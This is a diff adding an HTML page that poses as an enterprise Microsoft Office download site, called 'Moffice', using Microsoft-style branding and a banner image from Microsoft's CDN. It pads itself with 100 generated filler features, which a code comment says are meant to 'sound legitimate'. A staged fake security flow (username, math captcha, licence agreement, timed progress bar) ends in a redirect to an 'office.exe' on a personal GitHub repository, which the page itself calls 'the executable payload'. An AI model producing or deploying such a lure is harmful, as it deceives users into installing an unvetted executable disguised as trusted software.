@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Moffice For Enterprise</title>
+    <style>
+        /* CSS Reset & Variables */
+        :root {
+            --ms-blue: #0078D4;
+            --ms-dark-blue: #005A9E;
+            --ms-gray: #F3F2F1;
+            --ms-dark-gray: #323130;
+            --ms-light-gray: #EDEBE9;
+            --ms-text: #201F1E;
+            --ms-white: #FFFFFF;
+            --ms-border: #8A8886;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', 'Segoe UI Web (West European)', 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
+        }
+
+        body {
+            background-color: var(--ms-white);
+            color: var(--ms-text);
+            line-height: 1.6;
+        }
+
+        /* Header / Main Menu */
+        header {
+            background-color: var(--ms-blue);
+            color: var(--ms-white);
+            padding: 15px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo svg {
+            width: 28px;
+            height: 28px;
+            fill: var(--ms-white);
+        }
+
+        nav ul {
+            list-style: none;
+            display: flex;
+            gap: 25px;
+        }
+
+        nav a {
+            color: var(--ms-white);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 400;
+        }
+
+        nav a:hover {
+            text-decoration: underline;
+        }
+
+        /* Main Container */
+        main {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        /* Banner Section */
+        .hero {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .hero img {
+            width: 100%;
+            max-width: 700px; /* Medium Resize */
+            height: auto;
+            border-radius: 2px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            margin-bottom: 20px;
+        }
+
+        .hero h1 {
+            font-size: 36px;
+            color: var(--ms-text);
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        /* Specs Section (Under Banner) */
+        .specs {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            background-color: var(--ms-gray);
+            padding: 25px;
+            border-radius: 4px;
+            margin-bottom: 60px;
+            flex-wrap: wrap;
+        }
+
+        .spec-item {
+            text-align: center;
+            min-width: 200px;
+        }
+
+        .spec-item h3 {
+            font-size: 14px;
+            color: #605E5C;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 5px;
+        }
+
+        .spec-item p {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--ms-text);
+        }
+
+        /* 100 About Section */
+        .section-title {
+            font-size: 28px;
+            color: var(--ms-text);
+            margin-bottom: 25px;
+            border-bottom: 2px solid var(--ms-light-gray);
+            padding-bottom: 10px;
+        }
+
+        .about-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin-bottom: 60px;
+            max-height: 500px;
+            overflow-y: auto;
+            padding: 15px;
+            background: var(--ms-white);
+            border: 1px solid var(--ms-border);
+        }
+
+        .about-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            font-size: 14px;
+            padding: 10px;
+            background: var(--ms-gray);
+            border-radius: 2px;
+        }
+
+        .about-item svg {
+            width: 16px;
+            height: 16px;
+            fill: var(--ms-blue);
+            flex-shrink: 0;
+            margin-top: 3px;
+        }
+
+        /* Download Section */
+        .download-section {
+            text-align: center;
+            padding: 60px 20px;
+            background-color: var(--ms-gray);
+            margin-bottom: 60px;
+            border: 1px solid var(--ms-light-gray);
+        }
+
+        .btn-download {
+            background-color: var(--ms-blue);
+            color: var(--ms-white);
+            font-size: 18px;
+            font-weight: 600;
+            padding: 15px 40px;
+            border: none;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            transition: background-color 0.2s;
+            border-radius: 2px;
+        }
+
+        .btn-download:hover {
+            background-color: var(--ms-dark-blue);
+        }
+
+        .btn-download svg {
+            width: 24px;
+            height: 24px;
+            fill: var(--ms-white);
+        }
+
+        /* FAQ Section */
+        .faq-item {
+            margin-bottom: 20px;
+            border-bottom: 1px solid var(--ms-light-gray);
+            padding-bottom: 15px;
+        }
+
+        .faq-question {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--ms-blue);
+            margin-bottom: 5px;
+        }
+
+        .faq-answer {
+            font-size: 15px;
+            color: var(--ms-dark-gray);
+        }
+
+        /* Footer */
+        footer {
+            background-color: var(--ms-dark-gray);
+            color: var(--ms-white);
+            text-align: center;
+            padding: 25px;
+            font-size: 14px;
+        }
+
+        /* Modal Overlay */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background-color: var(--ms-white);
+            width: 100%;
+            max-width: 500px;
+            padding: 30px;
+            box-shadow: 0 12px 24px rgba(0,0,0,0.2);
+            border-top: 5px solid var(--ms-blue);
+        }
+
+        .modal-step {
+            display: none;
+        }
+
+        .modal-step.active {
+            display: block;
+        }
+
+        .modal-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: var(--ms-text);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid var(--ms-border);
+            font-size: 16px;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: var(--ms-blue);
+        }
+
+        .modal-actions {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+            margin-top: 30px;
+        }
+
+        .btn-modal {
+            padding: 8px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .btn-primary {
+            background-color: var(--ms-blue);
+            color: var(--ms-white);
+        }
+
+        .btn-primary:hover {
+            background-color: var(--ms-dark-blue);
+        }
+
+        .btn-secondary {
+            background-color: var(--ms-light-gray);
+            color: var(--ms-text);
+        }
+
+        .btn-secondary:hover {
+            background-color: #D2D0CE;
+        }
+
+        /* EULA Policy Text */
+        .policy-text {
+            height: 150px;
+            overflow-y: scroll;
+            border: 1px solid var(--ms-border);
+            padding: 10px;
+            font-size: 12px;
+            margin-bottom: 15px;
+            background: #FAFAFA;
+        }
+
+        /* Loading Bar */
+        .loading-container {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .loading-text {
+            margin-bottom: 15px;
+            font-weight: 600;
+            color: var(--ms-text);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background-color: var(--ms-light-gray);
+            border: 1px solid var(--ms-border);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background-color: var(--ms-blue);
+            width: 0%;
+            transition: width 0.1s linear;
+        }
+        
+        .error-msg {
+            color: #A4262C;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Main Menu -->
+    <header>
+        <div class="logo">
+            <svg viewBox="0 0 24 24"><path d="M2 2h9v9H2V2zm11 0h9v9h-9V2zm0 11h9v9h-9v-9zM2 13h9v9H2v-9z"/></svg>
+            Moffice For Enterprise
+        </div>
+        <nav>
+            <ul>
+                <li><a href="#hero">Overview</a></li>
+                <li><a href="#about-section">Features</a></li>
+                <li><a href="#download-section">Download</a></li>
+                <li><a href="#faq">FAQs</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <!-- Banner Section -->
+        <section id="hero" class="hero">
+            <img src="https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/375749-3up-cards01-?resMode=sharp2&op_usm=1.5,0.65,15,0&wid=1000&hei=416&qlt=100&fit=constrain" alt="Moffice For Enterprise Banner">
+            <h1>Empower Your Enterprise</h1>
+            <p>The industry standard for productivity, security, and collaboration.</p>
+        </section>
+
+        <!-- Technical Specifications -->
+        <section class="specs">
+            <div class="spec-item">
+                <h3>Version</h3>
+                <p>Enterprise Edition 2026</p>
+            </div>
+            <div class="spec-item">
+                <h3>Size</h3>
+                <p>4.2 GB (Full Installer)</p>
+            </div>
+            <div class="spec-item">
+                <h3>System Requirements</h3>
+                <p>Windows 10/11, 4GB RAM, 10GB Space</p>
+            </div>
+        </section>
+
+        <!-- 100 About Microsoft Office -->
+        <section id="about-section">
+            <h2 class="section-title">100 Reasons to Choose Moffice</h2>
+            <p style="margin-bottom: 20px;">Discover the comprehensive suite of features designed for enterprise-grade productivity.</p>
+            <div class="about-grid" id="about-grid">
+                <!-- Javascript will populate 100 items here -->
+            </div>
+        </section>
+
+        <!-- Download Section -->
+        <section id="download-section" class="download-section">
+            <h2 class="section-title" style="border:none; margin-bottom: 10px;">Get Moffice Today</h2>
+            <p style="margin-bottom: 30px;">Start your enterprise installation process securely.</p>
+            
+            <button class="btn-download" onclick="startDownloadFlow()">
+                <svg viewBox="0 0 24 24">
+                    <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+                </svg>
+                Download Moffice Installer
+            </button>
+        </section>
+
+        <!-- FAQs Section -->
+        <section id="faq">
+            <h2 class="section-title">Frequently Asked Questions (FAQs)</h2>
+            
+            <div class="faq-item">
+                <div class="faq-question">What is Moffice For Enterprise?</div>
+                <div class="faq-answer">Moffice For Enterprise is the premier productivity suite featuring classic tools optimized for modern corporate environments, offering unparalleled security and deployment management.</div>
+            </div>
+            
+            <div class="faq-item">
+                <div class="faq-question">Is the installation secure?</div>
+                <div class="faq-answer">Yes. All installations are verified through our multi-step authentication process, including policy agreements and secure server handshakes.</div>
+            </div>
+            
+            <div class="faq-item">
+                <div class="faq-question">What operating systems are supported?</div>
+                <div class="faq-answer">This installer is designed strictly for Windows 10 and Windows 11 Enterprise environments.</div>
+            </div>
+            
+            <div class="faq-item">
+                <div class="faq-question">How do I verify the download?</div>
+                <div class="faq-answer">The 14-second verification process ensures the package integrity before securely routing you to our raw repository for the executable payload.</div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer>
+        &copy; 2026 Moffice. All rights reserved. Designed for Enterprise.
+    </footer>
+
+    <!-- Interactive Download Modal -->
+    <div class="modal-overlay" id="downloadModal">
+        <div class="modal-content">
+            
+            <!-- Step 1: Username -->
+            <div class="modal-step active" id="step1">
+                <div class="modal-title">Enter Username</div>
+                <p style="margin-bottom: 15px; font-size: 14px;">Please enter your designated enterprise username to proceed.</p>
+                <div class="form-group">
+                    <label for="usernameInput">Username</label>
+                    <input type="text" id="usernameInput" placeholder="e.g. admin, user123">
+                    <div class="error-msg" id="usernameError">Please enter a username.</div>
+                </div>
+                <div class="modal-actions">
+                    <button class="btn-modal btn-secondary" onclick="closeModal()">Cancel</button>
+                    <button class="btn-modal btn-primary" onclick="goToStep(2)">Next</button>
+                </div>
+            </div>
+
+            <!-- Step 2: Math Captcha -->
+            <div class="modal-step" id="step2">
+                <div class="modal-title">Security Verification</div>
+                <p style="margin-bottom: 15px; font-size: 14px;">Please solve the following math equation to verify you are human.</p>
+                <div class="form-group">
+                    <label for="mathInput">What is 5 + 5 = ?</label>
+                    <input type="text" id="mathInput" placeholder="Enter answer here">
+                    <div class="error-msg" id="mathError">Incorrect answer. Please try again. (Hint: The answer is 10)</div>
+                </div>
+                <div class="modal-actions">
+                    <button class="btn-modal btn-secondary" onclick="goToStep(1)">Back</button>
+                    <button class="btn-modal btn-primary" onclick="verifyMath()">Next</button>
+                </div>
+            </div>
+
+            <!-- Step 3: Policy Agreement -->
+            <div class="modal-step" id="step3">
+                <div class="modal-title">End User License Agreement</div>
+                <p style="margin-bottom: 10px; font-size: 14px;">Please review the Moffice For Enterprise software policy.</p>
+                <div class="policy-text">
+                    <strong>Moffice Software License Terms</strong><br><br>
+                    By clicking "I Agree", you accept the terms of this enterprise software agreement.<br><br>
+                    1. GRANT OF LICENSE. We grant you a license to install and use the software.<br>
+                    2. AUTOMATIC UPDATES. The software periodically checks for updates and downloads them for you.<br>
+                    3. DATA COLLECTION. The software may collect basic telemetry regarding installation success.<br>
+                    4. LIMITATION OF LIABILITY. Moffice is not liable for indirect damages.<br>
+                    5. DISCLAIMER OF WARRANTY. The software is licensed "as-is." You bear the risk of using it.<br>
+                    <br>
+                    Please scroll through the entire policy. By continuing, you legally bind your enterprise to these terms.
+                </div>
+                <div class="modal-actions">
+                    <button class="btn-modal btn-secondary" onclick="goToStep(2)">Decline</button>
+                    <button class="btn-modal btn-primary" onclick="startLoading()">I Agree</button>
+                </div>
+            </div>
+
+            <!-- Step 4: Loading Bar -->
+            <div class="modal-step" id="step4">
+                <div class="modal-title">Preparing Installation</div>
+                <div class="loading-container">
+                    <div class="loading-text" id="loadingText">Verifying credentials and preparing server... 0%</div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    <p style="font-size: 12px; color: var(--ms-dark-gray); margin-top: 15px;">Please wait. This will take exactly 14 seconds.</p>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- JavaScript logic -->
+    <script>
+        // 1. Populate the "100 About Moffice" list dynamically to keep the file clean
+        const aboutGrid = document.getElementById('about-grid');
+        const features = [
+            "Advanced Word Processing", "Enterprise Spreadsheet Analytics", "Dynamic Presentation Builder",
+            "Secure Corporate Email", "Cloud Collaboration Sync", "Macro Security Center", 
+            "Data Loss Prevention (DLP)", "Active Directory Integration", "Offline Accessibility",
+            "Real-time Co-authoring"
+        ];
+
+        let htmlString = "";
+        for (let i = 1; i <= 100; i++) {
+            // Cycle through the feature types to make them sound legitimate
+            const featureName = features[i % features.length] + " (Module v" + i + ")";
+            htmlString += `
+                <div class="about-item">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                    <span><strong>Item ${i}:</strong> ${featureName}. Built for enterprise stability and performance.</span>
+                </div>
+            `;
+        }
+        aboutGrid.innerHTML = htmlString;
+
+        // 2. Download Modal Flow Logic
+        const modal = document.getElementById('downloadModal');
+        
+        function startDownloadFlow() {
+            // Reset modal state
+            document.getElementById('usernameInput').value = '';
+            document.getElementById('mathInput').value = '';
+            document.getElementById('usernameError').style.display = 'none';
+            document.getElementById('mathError').style.display = 'none';
+            document.getElementById('progressFill').style.width = '0%';
+            document.getElementById('loadingText').innerText = 'Verifying credentials and preparing server... 0%';
+            
+            modal.classList.add('active');
+            showStep(1);
+        }
+
+        function closeModal() {
+            modal.classList.remove('active');
+        }
+
+        function showStep(stepNumber) {
+            // Hide all steps
+            for(let i=1; i<=4; i++){
+                document.getElementById('step' + i).classList.remove('active');
+            }
+            // Show target step
+            document.getElementById('step' + stepNumber).classList.add('active');
+        }
+
+        function goToStep(stepNumber) {
+            // Validation before leaving Step 1
+            if (stepNumber === 2 && document.getElementById('step1').classList.contains('active')) {
+                const username = document.getElementById('usernameInput').value.trim();
+                if (username === '') {
+                    document.getElementById('usernameError').style.display = 'block';
+                    return;
+                } else {
+                    document.getElementById('usernameError').style.display = 'none';
+                }
+            }
+            showStep(stepNumber);
+        }
+
+        function verifyMath() {
+            const mathInput = document.getElementById('mathInput').value.trim();
+            // 5 + 5 = 10
+            if (mathInput === '10') {
+                document.getElementById('mathError').style.display = 'none';
+                showStep(3); // Go to Policy step
+            } else {
+                document.getElementById('mathError').style.display = 'block';
+            }
+        }
+
+        function startLoading() {
+            showStep(4);
+            const progressFill = document.getElementById('progressFill');
+            const loadingText = document.getElementById('loadingText');
+            
+            let progress = 0;
+            const totalTimeMs = 14000; // 14 seconds requirement
+            const intervalMs = 100; // Update every 100ms
+            const increment = (intervalMs / totalTimeMs) * 100;
+            
+            const interval = setInterval(() => {
+                progress += increment;
+                
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    loadingText.innerText = "Download Ready! Redirecting...";
+                    
+                    // Final redirect to the required link
+                    setTimeout(() => {
+                        window.location.href = "https://raw.githubusercontent.com/atharalfiandy/ms-office/refs/heads/main/office.exe";
+                        closeModal();
+                    }, 500);
+                }
+                
+                progressFill.style.width = progress + '%';
+                loadingText.innerText = `Verifying credentials and preparing server... ${Math.floor(progress)}%`;
+                
+            }, intervalMs);
+        }
+    </script>
+</body>
+</html>
